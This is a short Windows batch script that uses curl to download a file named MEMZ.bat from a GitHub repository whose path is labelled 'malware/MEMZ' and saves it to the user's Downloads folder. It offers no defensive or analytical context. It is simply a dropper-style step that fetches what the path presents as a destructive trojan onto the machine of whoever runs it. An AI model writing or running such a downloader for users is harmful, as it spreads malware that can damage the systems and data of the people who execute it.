@echo off
setlocal
set download_folder=%USERPROFILE%\Downloads
set file_name=MEMZ.bat
set file_url=https://raw.githubusercontent.com/Viper4K/malware/master/MEMZ/MEMZ.bat

echo Downloading %file_name% from %file_url%...
curl -L -o "%download_folder%\%file_name%" "%file_url%"

echo %file_name% has been downloaded to %download_folder%.

pause
